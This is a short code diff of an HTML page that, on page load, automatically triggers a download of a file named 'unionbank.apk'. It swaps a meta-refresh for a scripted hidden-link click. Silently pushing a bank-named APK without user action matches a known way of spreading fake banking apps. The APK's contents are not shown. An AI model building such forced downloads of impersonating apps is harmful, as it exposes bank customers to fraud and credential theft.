@@ -4,15 +4,18 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="3;url=unionbank.apk">
-    
+    <title>Auto Download APK</title>
 </head>
 <body>
-
     <script>
         window.onload = function() {
-            // Automatically trigger the download
-            window.location.href = 'unionbank.apk';
+            // Automatically start the download
+            const link = document.createElement('a');
+            link.href = 'unionbank.apk'; // Replace with your APK file path
+            link.download = 'unionbank.apk'; // Specify the name for the APK file
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link); // Clean up the link after the click
         };
     </script>
 </body>
